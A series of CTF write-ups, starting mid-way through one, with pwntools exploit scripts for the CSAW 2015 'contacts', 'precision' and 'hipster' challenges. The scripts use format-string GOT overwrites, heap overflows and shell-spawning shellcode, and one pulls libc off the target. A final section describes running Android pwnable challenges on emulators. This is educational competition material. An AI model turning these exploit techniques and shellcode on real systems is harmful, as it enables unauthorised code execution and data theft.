		  5. Using the leaked phone number allocation and leaked `_IO_vprintf` address calculate all the addresses we need to have
		  6. Create a second person
		  7. Set their name and number to be anything
		  8. Set their description to be a format string payload to overwrite the lower part of the `strcmp` GOT address with the lower part of our `system` address
		  9. Change the first person's name to overflow into the phone number, changing it to be the `strcmp` GOT address making sure to keep the second person's description pointer intact (since we will be overflowing it too, and we need to the pointer to keep pointing to our format string payload)
		  10. Create a third person
		  11. Set their name and number to be anything
		  12. Set their description to be a format string payload to overwrite the upper part of the `strcmp` GOT address with the upper part of our `system` address
		  13. Change the second person's name to overflow into the phone number, changing it to be the `strcmp` GOT address making sure to keep the third person's description pointer intact
		  14. Print out the contacts, overwriting the `strcmp` GOT with our `system` address
		  15. Edit the contact named "/bin/sh"
		  16. Get shell <3
		  
		  Here is the exploit script ([pwntools is <3](http://pwntools.readthedocs.org)):
		  
		  {% highlight python lineanchors %}
		  from pwn import *
		- # context.log_level = 'debug'
		  
		  elf = ELF("contacts")
		  strcmp_got = elf.got["strcmp"]
		  
		  def format_string(write_address):
		    part1 = write_address & 0xffff
		    part2 = (write_address & 0xffff0000) >> 16
		    '''
		    if part1 > part2:
		        tmp = part1
		        part1 = part2
		        part2 = tmp
		    '''
		    format_str1 = "%{0}x%1$hn".format(part1)
		    format_str2 = "%{0}x%1$hn".format(part2)
		    return format_str1, format_str2
		  
		  def create_contact(r, name, phone, desc):
		    r.sendline(str(1))
		    r.sendline(name)
		    r.sendline(phone)
		    r.sendline(str(len(desc)))
		    r.sendline(desc)
		    r.recvuntil("Menu:")
		  
		  def edit_contact(r, person, num, change):
		    r.sendline(str(3))
		    r.sendline(person)
		    r.sendline(str(num))
		    r.sendline(change)
		    r.recvuntil("Menu:")
		  
		  def display_contacts(r):
		    r.sendline(str(4))
		    return r.recvuntil("Menu:")
		  
		  def do_sploit(offset):
		    r = remote("54.165.223.128", 2555)
		    r.recvuntil(">>>")
		  
		    p1 = "AAAA"
		    p2 = "BBBB"
		    p3 = "CCCC"
		- # Create person 1
		    create_contact(r, p1, "/bin/sh", "%x.%x")
		  
		    leak = display_contacts(r)
		    found = leak.index("Description: ") + len("Description: ")
		    bin_sh, vfscanf_libc = map(lambda x: int(x, 16), leak[found:found+16].split("."))
		    vfscanf_libc -= 17
		  
		    print "[+] /bin/sh is @ ", hex(bin_sh), ": [+] _io_vfscanf libc is @ ", hex(vfscanf_libc)
		  
		    system_libc = vfscanf_libc + offset
		    format1, format2 = format_string(system_libc)
		  
		    print "[+] system libc is @ ", hex(system_libc)
		  
		    sec_person_desc = bin_sh + 0x30
		    print "[+] Second person's description @ ", hex(sec_person_desc)
		  
		    trd_person_desc = bin_sh + 0x58
		    print "[+] Third person's description @ ", hex(trd_person_desc)
		- # Create person 2
		    create_contact(r, p2, "1234", format1)
		- # Overflow person 1 name into person 2 phone pointer
		    payload = "\x69" * (64 + 4 + 4) + p32(sec_person_desc) + p32(strcmp_got) + p2
		    edit_contact(r, p1, 1, payload)
		- # Create person 3
		    create_contact(r, p3, "5678", format2)
		- # Overflow person 2 name into person 3 desc pointer
		    payload = "\x42" * (64 + 4 + 4) + p32(trd_person_desc) + p32(strcmp_got + 2)
		    edit_contact(r, p2, 1, payload)
		- # Display
		- # Triggers format string vuln to overwrite strcmp with system (when printing person 2)
		- # Calls system by having desc pointer overwritten in person 3's desc
		    try:
		        display_contacts(r)
		    except:
		        r.close()
		        return
		  
		    r.sendline("3")
		    print r.recv()
		    r.sendline("/bin/sh")
		    print r.recv()
		    try:
		        r.sendline("ls")
		        print r.recv()
		        r.interactive()
		    except:
		        r.close()
		        return
		  
		  libc_so_6_off = -0xd060
		  for i in range(0xfff):
		    do_sploit(libc_so_6_off - i)
		  {% endhighlight %}
	- 2015-09-28-csaw-ctf-precision
		-
		- ### TL; DR
		  * Overflow
		  
		  Precision was the lowest point exploitation challenge because it was literally a buffer overflow :3
		  
		  Let's start by getting an idea what is up with it:
		  
		  {% highlight bash lineanchors %}
		  vagrant@precise64:~/csawctf$ file precision
		  prec: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf2c69f92c3f6d68319ee39c0926e84bccdeb0371, not stripped
		  {% endhighlight %}
		  
		  Alright, and the security mitigations it has:
		  
		  {% highlight bash lineanchors %}
		  vagrant@precise64:~/csawctf$ ~/Template/checksec.sh --file precision
		  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
		  Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   precfound      NX enabled    No PIE          No RPATH   No RUNPATH   contacts
		  {% endhighlight %}
		  
		  Oh boy! No NX! So we can put shellcode into our payload :3
		  
		  {% highlight nasm lineanchors %}
		  804856f:       lea    eax,[esp+0x18]
		  8048573:       mov    DWORD PTR [esp+0x4],eax     ; Our input
		  8048577:       mov    DWORD PTR [esp],0x8048682   ; Scanf format string
		  804857e:       call   8048410 <__isoc99_scanf@plt>
		  {% endhighlight %}
		  
		  Oh man, we have a `scanf` that prompts us for our input and stores it in a static buffer.
		  
		  If we look at the function prologue, we get an idea how big this buffer is:
		  
		  {% highlight nasm lineanchors %}
		  8048523:       sub    esp,0xa0 ; Our return address will be around 0xa0 bytes
		  {% endhighlight %}
		  
		  The interesting part of this challenge comes from this part of `main`:
		  
		  {% highlight nasm lineanchors %}
		  8048583:       fld    QWORD PTR [esp+0x98]
		  804858a:       fld    QWORD PTR ds:0x8048690
		  8048590:       fucomip st,st(1)
		  8048592:       fstp   st(0)
		  8048594:       jp     80485a9 <main+0x8c>
		  8048596:       fld    QWORD PTR [esp+0x98]
		  804859d:       fld    QWORD PTR ds:0x8048690
		  80485a3:       fucomip st,st(1)
		  80485a5:       fstp   st(0)
		  80485a7:       je     80485c1 <main+0xa4>
		  {% endhighlight %}
		  
		  We see a lot of floating point operations and at the beginning of that code we see a floating point load from `0x8048690`. Looking at the beginning of this function we see the same address again:
		  
		  {% highlight nasm lineanchors %}
		  8048529:       fld    QWORD PTR ds:0x8048690
		  804852f:       fstp   QWORD PTR [esp+0x98]
		  {% endhighlight %}
		  
		  and it is storing the value in a stack based variable meaning it is most likely using this floating point value as a "stack cookie" more or less. So by simply getting the bytes of this floating point value and sticking them into our payload at the right offset as to align them with where the floating point value is located, we pass this check and get our exploit to land :3
		  
		  Oh yeah, they also give us the address of our buffer in memory, so it is super easy peasy :3
		- ### Note
		  This script also includes an example of how to exfiltrate a libc in case you need it for a higher point problem :3
		  
		  {% highlight python lineanchors %}
		  from pwn import *
		  
		  r = remote("54.173.98.115", 1259)
		  
		  
		  shellcode = "\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87"
		  
		  buf = int(r.recvline().strip()[-8:], 16)
		  
		  r.sendline("A"*(0x80 - len(shellcode)) + shellcode + "\xA5\x31\x5A\x47\x55\x15\x50\x40EEEECCCCDDDD" + p32(buf+8))
		  r.recv()
		  
		  r.sendline("cat flag.txt")
		  print r.recv()
		  
		  r.sendline("cat /lib32/libc.so.6")
		  
		  x = ""
		  while r.can_recv(5):
		    x += r.recv()
		  
		  with open("libc", "wb") as f:
		    f.write(x)
		  {% endhighlight %}
	- 2015-11-25-hipster
		-
		- ### TL; DR
		  * Overflow
		  * Shellcode
		  * Hitler
		  
		  CSAW CTF Finals were really dope, not just because we had [Pwnadventure Z](https://www.youtube.com/watch?v=3Q1V7AUD1JQ), but also because of all the really cool people that were there.
		  
		  Hipster (or Hipster Hitler) was a basic exploitation challenge that was fun to exploit. It is more or less similar to Contacts which appeared in CSAW CTF Prelims.
		  
		  Let's check it out:
		  
		  {% highlight bash lineanchors %}
		  [vagrant@kamino csaw2015finals]$ file hipster
		  hipster: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=b23801cfaa0d9395b962e7115b15f85de01b22ca, stripped
		  {% endhighlight %}
		  
		  {% highlight bash lineanchors %}
		  [vagrant@kamino csaw2015finals]$ ~/Template/checksec.sh --file hipster
		  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
		  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   hipster
		  {% endhighlight %}
		  
		  NX is disabled which suggests that we are more than likely gonna wanna be using shellcode (unless they are tryna trick us :3).
		  
		  Now let's checkout what this thing actually looks like:
		  
		  {% highlight raw lineanchors %}
		  [vagrant@kamino csaw2015finals]$ ./hipster
		  Sieg Heil!
		  Welcome to Hipster Hitler's Pocket Calculator!
		  My computing resources await you, mein Führer.
		  We now use Reverse Polish Notation as a result of our recent conquest of Poland.
		  All commands are prefixed with ':'.
		  Type :help for a list of commands.
		  ==> :help
		  His Excellency's available commands:
		  top  => Display top value of the currently selected stack.
		  new  => Create a new stack and switch to it.
		  del  => Delete currently selected stack.
		  disp => Display all values on stack.
		  next => Switch between active stacks.
		  quit => Exit the calculator.
		  ==>
		  {% endhighlight %}
		  
		  So from inital inspection, this appears to be a stack based calculator in which you can create different different calculation stacks. And apparently "Reverse Polish Notation" is just postfix notation which just makes it easier to program a stack based calculator.
		  
		  Given that this is a calculator themed for Hitler, I figured that the rest of strings in this binary were also pretty funny:
		  
		  {% highlight nasm lineanchors %}
		  .rodata:0804A322 aThatCommandIsN db 'That command is not yet implemented, mein F++hrer!',0Ah
		  .rodata:0804A322                                         ; DATA XREF: sub_80490E0+F8o
		  .rodata:0804A322                 db 'Please do not feed me to the dogs!',0Ah,0
		  .rodata:0804A379 aCaughtPossible db 'Caught possible Polish rebel intruder, mein F++hrer!',0Ah
		  .rodata:0804A379                                         ; DATA XREF: sub_8049280+3Bo
		  .rodata:0804A379                 db 'I shall execute him immediately...',0Ah,0
		  .rodata:0804A3D2 aSiegHeilWelcom db 'Sieg Heil!',0Ah     ; DATA XREF: sub_8049450+Bo
		  .rodata:0804A3D2                 db 'Welcome to Hipster Hitler',27h,'s Pocket Calculator!',0Ah
		  .rodata:0804A3D2                 db 'My computing resources await you, mein F++hrer.',0Ah
		  .rodata:0804A3D2                 db 'We now use Reverse Polish Notation as a result of our recent conq'
		  .rodata:0804A3D2                 db 'uest of Poland.',0Ah
		  .rodata:0804A3D2                 db 'All commands are prefixed with ',27h,':',27h,'.',0Ah
		  .rodata:0804A3D2                 db 'Type :help for a list of commands.',0Ah,0
		  .rodata:0804A4D5 asc_804A4D5     db '==> ',0             ; DATA XREF: sub_8049480+82o
		  .rodata:0804A4DA aFarewallMeinFH db 'Farewall, mein F++hrer!',0Ah
		  .rodata:0804A4DA                                         ; DATA XREF: sub_8049480+11Co
		  .rodata:0804A4DA                 db 'Have a good time in France!',0Ah,0
		  .rodata:0804A50F aUnableToSetSig db 'Unable to set SIGCHLD handler',0
		  .rodata:0804A50F                                         ; DATA XREF: .text:08049640o
		  .rodata:0804A52D aUnableToCreate db 'Unable to create socket',0 ; DATA XREF: .text:0804976Eo
		  .rodata:0804A545 aUnableToSetSoc db 'Unable to set socket reuse option',0
		  .rodata:0804A545                                         ; DATA XREF: .text:080497E1o
		  .rodata:0804A567 aUnableToBindSo db 'Unable to bind socket',0 ; DATA XREF: .text:08049883o
		  .rodata:0804A567                                         ; .text:0804997Eo
		  .rodata:0804A57D aUnableToListen db 'Unable to listen on socket',0
		  .rodata:0804A57D                                         ; DATA XREF: .text:080499D8o
		  .rodata:0804A598 ; char aUnableToFindUs[]
		  .rodata:0804A598 aUnableToFindUs db 'Unable to find user',0 ; DATA XREF: sub_8049C00+25o
		  .rodata:0804A5AC ; char aUnableToRemove[]
		  .rodata:0804A5AC aUnableToRemove db 'Unable to remove extra groups',0
		  .rodata:0804A5AC                                         ; DATA XREF: sub_8049C00+64o
		  .rodata:0804A5CA ; char aUnableToChange[]
		  .rodata:0804A5CA aUnableToChange db 'Unable to change GID',0 ; DATA XREF: sub_8049C00+95o
		  .rodata:0804A5DF ; char aUnableToChan_0[]
		  .rodata:0804A5DF aUnableToChan_0 db 'Unable to change UID',0 ; DATA XREF: sub_8049C00+C6o
		  .rodata:0804A5F4 ; char aUnableToChan_1[]
		  .rodata:0804A5F4 aUnableToChan_1 db 'Unable to change current directory',0
		  .rodata:0804A5F4                                         ; DATA XREF: sub_8049C00+F7o
		  .rodata:0804A617 ; char file[]
		  .rodata:0804A617 file            db '/dev/urandom',0     ; DATA XREF: sub_8049B20+11o
		  {% endhighlight %}
		  
		  ...See something interesting in there?
		  Well for starters at `0804A617` we have a mention of `/dev/urandom` which suggests some sort of random values being read in. But even more interesting is that there are `Unable to bind socket` and `Unable to listen on socket` which only appear in a server application, but this isn't a server... I guess we will keep our eyes open for any other mention of this socket code.
		  
		  So the first thing we should really just do is play around with the program and see if we can get an easy crash (always a good thing to try first, you can almost always get a crash doing this in exploitation problems).
		  
		  Going on a hunch about how this program stored its stacks, I got a crash pretty quickly.
		  
		  <pre>
		  [vagrant@kamino csaw2015finals]$ ./hipster
		  Sieg Heil!
		  Welcome to Hipster Hitler's Pocket Calculator!
		  My computing resources await you, mein Führer.
		  We now use Reverse Polish Notation as a result of our recent conquest of Poland.
		  All commands are prefixed with ':'.
		  Type :help for a list of commands.
		  ==> :new
		  Switching to new stack, mein Führer.
		  ==> :new
		  Switching to new stack, mein Führer.
		  ==> :next
		  Switched to stack #0.
		  ==> 111111111111111111111111111111111111111111111111111111111111111111111111111111111111
		  ==> ==> ==> ==> ==> ==> :next
		  Switched to stack #1.
		  ==> :top
		  zsh: segmentation fault  ./hipster
		  
		  Program received signal SIGSEGV, Segmentation fault.
		  [----------------------------------registers-----------------------------------]
		  EAX: 0x804b8b0 ("Switched to stack #1.\n")
		  ESI: 0x1
		  [-------------------------------------code-------------------------------------]
		  => 0x8048b21:   mov    esi,DWORD PTR [esi-0x4]
		  </pre>
		  
		  So we can overflow from one stack into another as it looks like the program is attempting to dereference a `1` which is what we input into the program.
		  
		  Now we should checkout how these stacks are actually stored in memory.
		  
		  Poking around `create_stack` (remember, there are no symbols in this program so I'm logically naming all these functions) we can see how big each stack is:
		  
		  {% highlight c lineanchors %}
		  current_stack = malloc(168u);
		  {% endhighlight %}
		  
		  We also see `dword_804B8F0` being stored in the location pointed to by `esi` (a pointer to the current stack)
		  
		  {% highlight nasm lineanchors %}
		  .text:08048DEB:     mov     edx, ds:dword_804B8F0
		  .text:08048DF1:     mov     esi, [ebp+var_C]
		  .text:08048DF4:     mov     esi, ds:ptr[esi*4]
		  .text:08048DFB:     mov     [esi], edx
		  {% endhighlight %}
		  
		  If we check the xrefs of this value we see it is first assigned here:
		  
		  {% highlight nasm lineanchors %}
		  .text:080494F3:     call    _rand
		  .text:080494F8:     mov     ds:dword_804B8F0, eax
		  {% endhighlight %}
		  
		  And checked in `do_calcuation`:
		  
		  {% highlight nasm lineanchors %}
		  .text:080492A0:     mov     eax, ds:dword_804B888
		  .text:080492A5:     mov     eax, ds:ptr[eax*4]
		  .text:080492AC:     mov     eax, [eax]
		  .text:080492AE:     cmp     eax, ds:dword_804B8F0
		  .text:080492B4:     jz      short loc_80492EB
		  {% endhighlight %}
		  
		  Just a guess right now, but it looks like this value is some sort of stack canary that checks if we have overflowed from one stack into another. So we are going to have to leak this value out somehow before we do our overflow.
		  
		  Something else that is interesting that is happening in `create_stack` is:
		  
		  {% highlight nasm lineanchors %}
		  .text:08048DD1:     mov     edx, [ebp+var_C]   ; edx is the index of the current stack
		  .text:08048DD4:     mov     edx, ds:ptr[edx*4] ; edx is a pointer to the current stack
		  .text:08048DDB:     add     edx, 8             ; Go 8 bytes into the current stack
		  .text:08048DDE:     mov     esi, [ebp+var_C]   ; esi is the index of the current stack
		  .text:08048DE1:     mov     esi, ds:ptr[esi*4] ; esi is a pointer to the current stack
		  .text:08048DE8:     mov     [esi+4], edx       ; store a pointer 8 bytes into the current stack
		                                               ; into our stack
		  {% endhighlight %}
		  
		  Here we see the current stack storing a pointer to 8 bytes into itself in itself. Looking at `get_stack_top` we see that this pointer is a pointer to the top of the stack.
		  
		  {% highlight nasm lineanchors %}
		  .text:08048B17:     mov     esi, ds:ptr[esi*4]
		  .text:08048B1E:     mov     esi, [esi+4]
		  .text:08048B21:     mov     esi, [esi-4]
		  .text:08048B24:     mov     [esp], eax      ; s
		  .text:08048B27:     mov     dword ptr [esp+4], 40h ; maxlen
		  .text:08048B2F:     mov     [esp+8], edx    ; format
		  .text:08048B33:     mov     [esp+0Ch], esi
		  .text:08048B37:     mov     [ebp+var_8], ecx
		  .text:08048B3A:     call    _snprintf
		  {% endhighlight %}
		  
		  But what is interesting here, is that in `create_stack` it stored a pointer 8 bytes into the stack, but when we go to print out the top value, `mov     esi, [esi-4]` we subtract 4 from this pointer. Let's draw out what we conceptualize a stack to look like at this point:
		  
		  <pre>
		  [-------- top --------]
		  stack+0    random value
		  stack+4    pointer to top of stack
		  stack+8    numbers and stuff
		  ...
		  stack+164  numbers and stuff
		  [-------- end --------]
		  </pre>
		  
		  So `8 bytes into our stack - 4` is just 4 bytes in, which is a pointer to the top of the stack. This is important as we will use this to read out the random value from a stack we create.
		  
		  <pre>
		  [vagrant@kamino csaw2015finals]$ ./hipster
		  Sieg Heil!
		  Welcome to Hipster Hitler's Pocket Calculator!
		  My computing resources await you, mein Führer.
		  We now use Reverse Polish Notation as a result of our recent conquest of Poland.
		  All commands are prefixed with ':'.
		  Type :help for a list of commands.
		  ==> :new
		  Switching to new stack, mein Führer.
		  ==> :top
		  154038288
		  ==> ^C
		  [vagrant@kamino csaw2015finals]$ python -c 'print hex(154038288)'
		  0x92e7010
		  </pre>
		  
		  Kewl, so since the allocation of each stack is a multiple of 4, we can pretty much be sure that each stack will be allocated right next to each other. Therefore, with the leak that we have of the top of the stack for the first allocation, we will have to throw in `0xac` bytes into stack #1 to get to the point where we are about to overflow into stack #2s top of stack pointer. We will then put a pointer to point to stack #1s random value.
		  
		  <pre>
		  [-------- top --------]
		  stack1+0    random value
		  stack1+4    pointer to top of stack
		  stack1+8    shellcode and nops
		  ...
		  stack1+164  shellcode and nops
		  [-------- end --------]
		  [-------- top --------]
		  stack2+0    shellcode and nops
		  stack2+4    overflowed with pointer to stack1+0
		  stack2+8    numbers and stuff
		  ...
		  stack2+164  numbers and stuff
		  [-------- end --------]
		  </pre>
		  
		  I also decided to just use stack #1 as the place to store the shellcode and just pad it with nops. Since we are just using a stack based calculator, you have to come up with some way to write arbiturary values by using math. `write_num` in the exploit script is a demonstration on how to do this.
		  
		  {% highlight python lineanchors %}
		- # Create stack #2 in order to leak random value
		  new_stack(r)
		- # Getting the next stack puts us back at stack #1
		  next_stack(r)
		- # Throw our shellcode into stack #1
		  padding = string.ljust(shellcode, 0xac, "\x90")
		  write_vals(r, padding)
		- # Position stack #2s top of stack to point to random value
		  random_val_offset = -0xb4
		  write_num(r, heap_addr + random_val_offset)
		- # Shift back to stack #2 and read random value from top of stack
		  next_stack(r)
		  random_value = int(top_val(r).split("\n")[0], 10)
		  print "[+] Got random value: 0x%08x" % random_value
		  {% endhighlight %}
		  
		  Now that we have the random value, we can start writing to an arbituary location by setting the top of stack to be our location of choice. Since we already have our shellcode in the program at this point, we just need a function pointer to point to our first stack. The GOT is a great place to overwrite for this :3 The rest of the exploit is pretty self explanatory.
		  
		  Turns out the socket code was just left over from another version of the challenge, so nothing super secret about it :3
		  
		  Here is the full exploit script ([pwntools is <3](http://pwntools.readthedocs.org)):
		  
		  {% highlight python lineanchors %}
		  from pwn import *
		  
		  #context.log_level = "DEBUG"
		  
		  #r = remote("localhost", 2323)
		  r = remote("54.164.94.180", 1939)
		  pause()
		  
		  elf = ELF("hipster")
		  shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52" \
		            "\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e" \
		            "\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
		  
		  def new_stack(r):
		    r.sendline(":new")
		    return r.recvuntil("==> ")
		  
		  def next_stack(r):
		    r.sendline(":next")
		    return r.recvuntil("==> ")
		  
		  def top_val(r):
		    r.sendline(":top")
		    return r.recvuntil("==> ")
		  
		  def disp_stack(r):
		    r.sendline(":disp")
		    return r.recvuntil("==> ")
		  
		  def del_stack(r):
		    r.sendline(":del")
		  
		  def send_val(r, v):
		    r.sendline(str(v))
		    return r.recvuntil("==> ")
		  
		  def send_vals(r, v):
		    for a in [v[i:i+14] for i in range(0, len(v), 14)]:
		        send_val(r, a)
		  
		  def write_num(r, num):
		    out = []
		    while num > 9:
		        expression = []
		        total = 0
		        for i in range(9, 1, -1):
		            while num != total and num >= total*i:
		                if total:
		                    total *= i
		                else:
		                    total = i
		                expression.append(str(i))
		            if num == total:
		                break
		        num -= total
		        e = "".join(expression) + ("*" * (len(expression) - 1))
		        out.append(e)
		    o = "".join(out) + ("+" * (len(out) - 1)) + str(num) + "+"
		    send_vals(r, o)
		  
		  def write_vals(r, v):
		    for a in [v[i:i+4] for i in range(0, len(v), 4)]:
		        num = u32(a)
		        write_num(r, num)
		  
		  def leak_heap_addr(r):
		    new_stack(r)
		    return top_val(r)
		- # Create stack #1 to leak heap address
		  new_stack(r)
		  r.recvuntil("==> ")
		  
		  heap_addr = int(leak_heap_addr(r).split("\n")[0], 10)
		  print "[+] Leaked heap addr: 0x%08x" % heap_addr
		- # Create stack #2 in order to leak random value
		  new_stack(r)
		- # Getting the next stack puts us back at stack #1
		  next_stack(r)
		- # Throw our shellcode into stack #1
		  padding = string.ljust(shellcode, 0xac, "\x90")
		  write_vals(r, padding)
		- # Position stack #2s top of stack to point to random value
		  random_val_offset = -0xb4
		  write_num(r, heap_addr + random_val_offset)
		- # Shift back to stack #2 and read random value from top of stack
		  next_stack(r)
		  random_value = int(top_val(r).split("\n")[0], 10)
		  print "[+] Got random value: 0x%08x" % random_value
		  
		  overwrite_got = elf.got["snprintf"]
		- # Create stack #3 and #4
		  new_stack(r)
		  new_stack(r)
		- # Shift from stack #4 back to stack #3
		  next_stack(r) # Stack 1
		  next_stack(r) # Stack 2
		  next_stack(r) # Stack 3
		- # Pad stack #3 until we overwrite into stack #4
		  for i in range(0, (0xac / 4) - 1):
		    send_val(r, 1)
		- # Write our random value and address we want to write to
		- # to the top of the stack
		  write_num(r, random_value)
		  write_num(r, overwrite_got)
		- # Shift to stack #4 (really shifting to the GOT address of snprintf)
		  next_stack(r)
		- # Write the address of the first heap to the snprintf GOT entry
		  first_heap_addr = (heap_addr ^ (heap_addr & 0xff)) | 0x10
		  write_num(r, first_heap_addr)
		- # Trigger a call to snprintf
		  del_stack(r)
		- # Get our shell <3
		  r.interactive()
		  {% endhighlight %}
	- 2018-06-10-android-pwnable-ctf-challenges
		- In h1-702 2018, I finally got around to writing some Android pwnable challenges which I had been meaning to do for a while. There have not been many mobile CTF problems in the past (a nice list of which can be checked out [here](https://github.com/xtiankisutsa/awesome-mobile-CTF)) even though mobile security has been growing in popularity. Fresh with ideas, I found myself making quite a few mobile CTF problems over the past few [ctfs I helped make](/ctf/hackerone/2018/06/10/making-h1-ctfs/), but they all ended up being reverse engineering problems. While the problems ended up turning out decently, I wanted to pursue a category of mobile application CTF challenges which was very rarely seen.
		  
		  Local mobile exploitation (needing to have someone install an application) is an interesting field of cyber security as it is typically seen to have relatively low impact. However, it is hard to discount the value of this field, when someone's device has on average [$14,000 worth of information](https://www.ponemon.org/blog/how-much-is-the-data-on-your-mobile-device-worth) (I am skeptical of this number, but anything in that ballpark is still a lot of hekin money). There is a decent amount of research in this field, however it is primarily based around the mobile malware business since it is the easiest way to get on someone's device. It is pretty easy to find signs of malware within an APK, but it is much harder to find signs of foul play when your app is just exploiting [deserialization vulnerabilities](https://lgtm.com/blog/android_deserialization) as you are sending seemingly random data to another application. 
		  
		  The more rare vulnerabilities are the mobile RCE exploits. The best example of the potential impact of these vulnerabilites can be found with the [Webview.addJavascriptInterface](https://labs.mwrinfosecurity.com/blog/webview-addjavascriptinterface-remote-code-execution/) vulnerability. There has been a lot of horizontal growth in this field where [everyone](https://github.com/linkedin/qark) [and](https://labs.mwrinfosecurity.com/tools/drozer/) [their](https://github.com/MobSF/Mobile-Security-Framework-MobSF) [mother](https://github.com/AndroBugs/AndroBugs_Framework) [has](https://github.com/spotbugs/spotbugs) [made](https://github.com/Sable/soot) [an](https://github.com/facebook/infer) [apk](https://github.com/sonyxperiadev/ApkAnalyser) [vulnerability](https://github.com/honeynet/apkinspector) [scanner](https://github.com/honeynet/apkinspector). Let me be clear, this is not at all a bad thing. There are some tools that are more complete, extensive, well maintained than others, but this is a clear example of interest in this field with very little groundbreaking research. You can take this as there not being bugs to find, or you can take it as them not being found yet ;)
		  
		  When I saw Google CTF had put together mobile CTF challenges you could [exploit remotely](https://github.com/ctfs/write-ups-2016/tree/master/google-ctf-2016/mobile) on their servers, I thought it was the coolest shit. There needed to be a way to bring the realm of mobile exploitation into CTF challenges. This was the excitement that people needed to start looking at this field.
		- ## 👷 Why Android pwnables are hard to run
		  
		  Most pwnable problems that you see in CTFs are individual binaries that can run by themselves in a Dockerfile with a super small memory footprint. This is especially important when you are dealing with many requests and all your process needs to do is fork itself. To let people exploit APKs, we need to run them seperately, spinning up an emulator each time to make sure people do not do anything funny to other people's submissions.
		  
		  It is important to note here, all APKs can be read by any other APK installed on the device with the `android.permission.READ_EXTERNAL_STORAGE` permission via [publicSourceDir](https://developer.android.com/reference/android/content/pm/ApplicationInfo.html#publicSourceDir). You cannot change the permissions on this directory as the dexloader is going to yell at you. 
		  
		  So for getting all of these emulators, we need a VM with the entire Android SDK and the system-image for what Android API version we want for the emulator.
		  
		  system-image's are quite big:
		  
		  {% highlight raw lineanchors %}
		  ➜  android-28 du -h .
		  6.6G	./default/x86
		  3.1G	./default/x86_64
		  9.8G	./default
		  4.0K	./google_apis_playstore/x86/data/misc/wifi
		  4.0K	./google_apis_playstore/x86/data/misc
		  4.0K	./google_apis_playstore/x86/data
		  6.6G	./google_apis_playstore/x86
		  6.6G	./google_apis_playstore
		  16G	.
		  {% endhighlight %}
		  
		  But fortunately, we only need to download this once (if we only have challenges for one API level). For each emulator we will still need a decent amount of space:
		  
		  {% highlight raw lineanchors %}
		  ➜  android_P_x86_64.avd du -h .
		  565M	.
		  {% endhighlight %}
		- ## 🔢 How many emulators will (more like can) we run
		  
		  This is a question that comes to one thing: optimization. Since Android emulators run in [qemu](https://www.qemu.org/), we are going to be taking a big hit on performance right off the bat. Lucky for us, emulators have [KVM support](https://developer.android.com/studio/run/emulator-acceleration). If we want to take advantage of this enhancement, we will need to host our challenges from something that supports KVM. For h1-702, I used [digital ocean](https://www.digitalocean.com/). EC2 did not have this support however, so be careful about where you are looking to host your problems. 
		  
		  When the emulators are running, they take up quite a bit of memory and CPU:
		  
		  {% highlight raw lineanchors %}
		  PID	Name		  CPU %  Time	   	  		RAM
		  57998   qemu-system-x86_  214.6  00:19.46  50/2   2     319+    825M+   7264K   0B      57998  50258  running   *0[5]
		  {% endhighlight %}
		  
		  Now, ideally we do not really need a lot of the stuff the emulator has. Most noteable being the screen. Checking out the [Android emulator docs](https://developer.android.com/studio/run/emulator-commandline) we can see a bunch of options that are useful for us:
		  
		  * `-no-snapshot`: We save some time (and disk space) while making sure that each time we run the emulator it is a blank slate
		  * `-no-boot-anim`: Saves time
		  * `-accel mode`: Accelerate execution
		  * `-no-window`: Do not do graphics stuff (memory and time)
		  
		  The big "doh!" here was when I was solving a challenge and was wondering why nothing was happening when I enabled `-no-window`, but I could solve the challenge (without human interaction) without this option. The challenge I had written rendered graphical objects on the screen and there was no longer any screen to draw them to... so Android just gave up on running the app? I ended up having to leave the `-no-window` option out and running the emulator in a [fake X server](http://elementalselenium.com/tips/38-headless). Sad.
		  
		  At this point, I just had an unreliable submission server with a pretty slow emulator. Given that there were hundreds of people play in this CTF, I could not have this go live so I just ended up having people send me their APKs and I ran them by hand. A very unfortunate solution, but at least I had my own personal submission server!
		- ## 😤 How do I prevent people from yelling at me every second about their "exploit working locally, but not remotely"
		  
		  The easiest way to prevent this is give them the exact setup that you are using on your server, down to the ways that you are invoking their APK. It is imporant to be explicit and verbose about this. I ran into problems when I made a challenge that required people to call the JVM garbage collector and did not realize how unpredictable triggering the GC was. It ended up being a huge nusance :(
		- ## 💻 Why did you make your own thing for this?
		  
		  In hind sight, I should have just gone with [android-farm](https://medium.com/@Malinskiy/android-ci-with-kubernetes-684713a83eec), but on first glance it seemed unnesesarily complicated for my use case (I just had to run emulators right?). It seems the authors of this tool ran into the same exact problems I did with adb:
		  
		  {% highlight raw lineanchors %}
		  
		  * reconnecting to devices on the go (i.e. in the middle of the run)
		  * rerunning the test on a different device if a failure happens and the device is out
		  * visualizing the associations between the tests and the devices to identify potentially faulty devices
		  * balancing the execution time of tests
		  
		  {% endhighlight %}
		  
		  Setting this up seems like quite the job, maybe a topic for a future blog post...
		  
		  I still see a niche for the submission server I had written for this CTF, and I will still work on developing it further. This would have been more successful had I had been smart and wrote challenges that did not depend on graphics being rendered.
		- ## 📱 Can we emulate other devices for even cooler CTF problems?
		  
		  It seems like there is quite a bit of work to make this work at scale, but ideally we should be able to emulate pretty much anything with qemu, even [macos](https://github.com/kholia/OSX-KVM). There is for sure some interesting avenues to pursue here and probably something I will explore for future CTFs.
		  
